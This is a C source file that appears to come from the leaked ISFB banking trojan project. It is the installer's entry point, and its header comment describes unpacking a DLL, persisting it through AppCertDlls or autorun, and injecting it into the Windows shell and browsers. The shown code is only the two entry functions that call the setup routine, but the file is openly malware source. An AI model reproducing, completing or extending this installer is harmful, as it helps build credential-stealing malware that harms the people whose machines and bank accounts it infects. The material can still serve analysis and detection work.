//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: exe.c
// $Revision: 256 $
// $Date: 2014-06-28 18:54:55 +0400 (Сб, 28 июн 2014) $
// description:
//	ISFB client installer.
//	This process contains packed client DLL image in resources. When started, it unpacks client DLL, copies it into 
//	one of system folders, registers it within either AppCertDlls key or Windows autorun, and attempts to inject it into the
//	 Windows Shell process and all known browsers.


#include "common\common.h"

//	Predifinitions
WINERROR CrmSetup(LPTSTR pCmdLine);

//
//	 This is our application EntryPoint function.
//
WINERROR APIENTRY _tWinMain(
	HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPTSTR    lpCmdLine,
    int       nCmdShow
	)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("ISFB: Version: 2.6\n");
	DbgPrint("ISFB: Started as win32 process 0x%x.\n", GetCurrentProcessId());

	if ((g_AppHeap = HeapCreate(0, 0x400000, 0)))
	{
		g_CurrentModule = GetModuleHandle(NULL);
		Status = CrmSetup(lpCmdLine);
		HeapDestroy(g_AppHeap);
	}

	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	UNREFERENCED_PARAMETER(hInstance);

	DbgPrint("ISFB: Process 0x%x finished with status %u.\n", GetCurrentProcessId(), Status);

	return(Status);
}


//
//	 This is our application EntryPoint function to build it without CRT startup code.
//
INT _cdecl main(VOID)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("ISFB: Started as win32 process 0x%x\n", GetCurrentProcessId());

	if ((g_AppHeap = HeapCreate(0, 0x400000, 0)))
	{
		g_CurrentModule = GetModuleHandle(NULL);
		Status = CrmSetup(GetCommandLine());
		HeapDestroy(g_AppHeap);
	}

	DbgPrint("ISFB: Process 0x%x finished with status %u\n", GetCurrentProcessId(), Status);

	ExitProcess(Status);

	return(Status);
}




